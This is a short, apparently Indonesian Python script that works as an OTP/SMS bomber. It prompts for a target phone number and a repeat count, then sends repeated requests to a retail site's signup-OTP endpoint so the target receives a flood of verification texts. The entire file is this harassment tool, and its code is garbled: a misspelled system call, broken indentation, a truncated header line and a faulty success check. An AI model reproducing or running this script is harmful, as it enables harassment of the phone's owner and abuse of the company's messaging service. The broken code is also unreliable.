import json
import requests
import sys
import os


def main():
        os.systeam('clear')
        os.systeam('figlet adiewag93')
        banner= '''

       [+]AUTHOR  : adiewag93
       '''


      print(banner)
     no = input('target : ')
     jum = input('jumlah spam : ')

     head = {
     "User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chro                          >
     "Referer": "https://www.mapclub.com/en/user/signup",
     "Host": "cmsapi.mapclub.com",
     }


    dat = {
    'phone' : no
    }


    for  x in range(int(jum)):
             leosureo = requests.post("https://cmsapi.mapclub.com/api/signup-otp", headers=head, json=dat)
    if 'eror' in leosureo:
            print('gagal mengirim' + no)
    else:
            print('sukses mengirim' + no)


main()